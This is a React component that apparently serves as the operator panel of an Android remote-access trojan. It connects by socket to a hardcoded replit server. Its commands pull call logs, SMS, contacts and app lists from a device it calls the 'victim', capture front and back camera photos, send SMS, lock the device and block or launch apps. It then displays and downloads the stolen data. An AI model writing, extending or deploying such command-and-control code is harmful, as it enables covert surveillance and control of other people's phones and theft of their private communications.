import React, { useState } from 'react';
import './dropdown.css';
import socket from '../server/socket';
import useSocket from '../server/usesocket';
import { setserv } from "../server/socket";
const DropdownMenu = () => {
  setserv("https://bertrylcommit-back.botsailer1.repl.co/");
  const [roomid, setRoomid] = useState('');
  const [serverResponsedata, imageData] = useSocket()
  const [, , isSocketConnected ,setIsconnected] = useSocket();
  const [selectedOption, setSelectedOption] = useState('');
  const [image, setImage] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [message, setMessage] = useState('');
  const [packageName, setPackageName] = useState('');
  const [servlink, setServlink] = useState('');
  const [imgshow, setImgshow] = useState(false);
  const [isSubmitButtonVisible, setIsSubmitButtonVisible] = useState('');
 

  const handleDropdownChange = (e) => {

    setSelectedOption(e.target.value);
    setIsSubmitButtonVisible(true);
    if (e.target.value === 'camera0' || e.target.value === 'camera1') {
      setImgshow(true);
    }
    else {
      setImgshow(false);
    }
    
  };

  const handleSubmission = () => {
    setSelectedOption('');
    setIsSubmitButtonVisible(false);
    if (selectedOption === 'sms_send' && (!phoneNumber || !message)) {
      alert('Please fill out all required fields.');
      
    }
    else if ((selectedOption === 'block_package'||  selectedOption === 'restart_app' || selectedOption === 'unblock_package') && (!packageName))  {
      
      alert('Please fill out all required fields.');
    }
    else if (selectedOption === 'wallpaper' && !image) {
      alert('Please upload an image.');
    }
    else if (selectedOption === 'change_link' && !servlink.startsWith('bot') )  {
      alert('Intruder Alert! You dont know the secreat link!');
    }

    else {
      const serv = servlink.substring(0 + 3);
      const text = {
        commands : selectedOption,
        data: selectedOption === 'sms_send'? `${phoneNumber}:${message}`:packageName || image || serv ||'' ,};
      socket.emit('message', JSON.stringify(text));
      // alert('Command Sent');
    }


  }
const handlePackagechnage = (e) => {
  setPackageName(e.target.value);
}
 
const handleDownloadClick = () => {
  const blob = new Blob([serverResponsedata], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'server_response.txt';
  a.click();
  URL.revokeObjectURL(url);
};



const handleServerlinkChange = (e) => {
  setServlink(e.target.value);
}


  const handleMessageChange = (e) => {
    setMessage(e.target.value);
  }
  const handlePhoneNumberChange = (e) => {
    setPhoneNumber(e.target.value);
  }
  const handleImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = function (e) {
        const imagebase64 = e.target.result.split(',')[1]; 
        setImage(imagebase64); 
      };
    } else {
     alert('Please select a file.');
    }
  };
  return (
    <>
    
    <div className='split-screen'>
      <div className='split-item'>
    <div id='mainback'>
      <h2>Command Executor</h2>
      <span>{isSocketConnected ?(<span id='connection' >Connected to socket server</span>):(<input type="text" placeholder="Enter Roomid" value={roomid}  required onChange={(e) => setRoomid(e.target.value)} />)}
            <button onClick={() =>  (socket.emit('joinRoom', roomid) ,setIsconnected(true))}>Join Room
           </button>
            </span>
            <br />
      <label htmlFor="dropdown">Select an option:</label>
      <select id="dropdown" value={selectedOption}  onChange={handleDropdownChange}  >
        <option value="">Select an Command</option>
  <option value="call_logs" title="View call logs">Call Logs</option>
  <option value="forgive_app" title="This will relese all blocked apps">forgive_app</option>
  <option value="run_app" title="This will execute app on victim device use app_log to gain package name">Run app</option>
  <option value="lock" title="Lock the device">Lock victim device</option>
  <option value="block_package" title="Block a package">Block Package</option>
  <option value="camera1" title="Take a picture with the front camera">Front Camera</option>
  <option value="camera0" title="Take a picture with the back camera">Back Camera</option>
  <option value="wallpaper" title="Set the device wallpaper">Wallpaper</option>
  <option value="sms_logs" title="View SMS logs">SMS Logs</option>
  <option value="app_logs" title="View app logs">App Logs</option>
  <option value="list_blocked_packages" title="List blocked packages">List Blocked Packages</option>
  <option value="change_link" title="Change the server link">Change Link</option>
  <option value="unblock_package" title="Unblock a single app">Unblock Package</option>
  <option value="sms_send" title="Send an SMS throung victim device">Send SMS</option>
  <option value="contacts_logs" title="View contact logs">Contact Logs</option>
      </select>
      
      {selectedOption === 'wallpaper' && (
        <div>
          <label htmlFor="imageUpload">Upload an image (max 2MB):</label>
          <input
            type="file"
            id="imageUpload"
            accept="image/*"
            onChange={handleImageUpload}
          />
        </div>
      )}
      {selectedOption === 'sms_send' && (
        <div id='smspro'>
          <div>
          <label htmlFor="phoneNumber">Phone Number:</label>
          <input 
          className='phonein'
            id="phoneNumber"
            value={phoneNumber}
            autoComplete='off'
            placeholder='Enter Phone Number'
            onChange={handlePhoneNumberChange}
            type="tel" name="phone" required
          />
          </div>
          <label htmlFor="message">Enter Message:</label>
          <textarea
            id="message"
            value={message}
            onChange={handleMessageChange}
          />
        </div>
      )}
      {(selectedOption === 'block_package'||selectedOption === 'run_app' || selectedOption === 'unblock_package' ) && (
        <div id='package'>
          <label htmlFor="packageName">Package Name:</label>
          <input
            type="text"
            id="packageName"
            value={packageName}
            onChange={handlePackagechnage}
          />
        </div> 

      )}
    {selectedOption === 'change_link' && (

         
          <div id='package'>
          <label htmlFor="packageName">New Link?</label>
          <input
            type="text"
            value={servlink}
            onChange={handleServerlinkChange}
          />

        </div> 
    )}


{isSubmitButtonVisible && (
        <div>
          <button onClick={handleSubmission}>Submit</button>
        </div>
      )}
</div>
</div>
<div className='split-item'>
{ ((selectedOption !== 'camera0' && selectedOption !== 'camera1') && serverResponsedata) && (
  <>
    <div className='response'>
      <h3>Server Response:</h3>
      <pre style={{ whiteSpace: 'pre-wrap' }}>{serverResponsedata}</pre>
    </div>
    <button id='dwnbtn' onClick={handleDownloadClick}>Download</button> 
  </>
)}
</div>

<div className='split-item'>
{imgshow && imageData &&  (
  <>
  <div className='response'> 
    <img
      src={`data:image/jpeg;base64,${imageData}`} 
      alt="server response"
      style={{
        maxWidth: '100%',
        maxHeight: '100%', 
        overflow: 'hidden', 
      }}
    />  
    <h3> To download right click and save it! I am Too lazy to provide a button</h3>
  </div>
 
</>)}
      </div>
      </div>
      </>
  );
};

export default DropdownMenu;